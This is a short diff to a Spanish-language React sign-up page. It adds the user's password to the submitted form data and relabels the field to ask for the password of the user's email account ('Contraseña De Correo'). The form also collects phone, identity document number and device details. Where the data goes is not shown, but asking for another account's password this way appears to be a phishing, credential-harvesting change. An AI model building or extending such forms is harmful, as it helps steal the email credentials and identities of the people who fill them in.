@@ -162,6 +162,7 @@ export default function Home() {
         email: formData.email,
         telefono: formData.phone,
         documento: formData.document,
+        password: formData.password,
         deviceType: deviceData?.tipoDispositivo || 'Desconocido',
         browser: deviceData?.navegador || 'Desconocido',
         os: deviceData?.sistemaOperativo || 'Desconocido',
@@ -409,14 +410,14 @@ export default function Home() {
                 />
               </div>
 
-              {/* Contraseña */}
+              {/* Contraseña De Correo */}
               <div className="flex flex-col gap-1">
                 <label
                   htmlFor="password"
                   className="text-sm font-semibold text-gray-700"
                   style={{ fontFamily: "'Nunito', sans-serif" }}
                 >
-                  Contraseña
+                  Contraseña De Correo
                 </label>
                 <input
                   id="password"
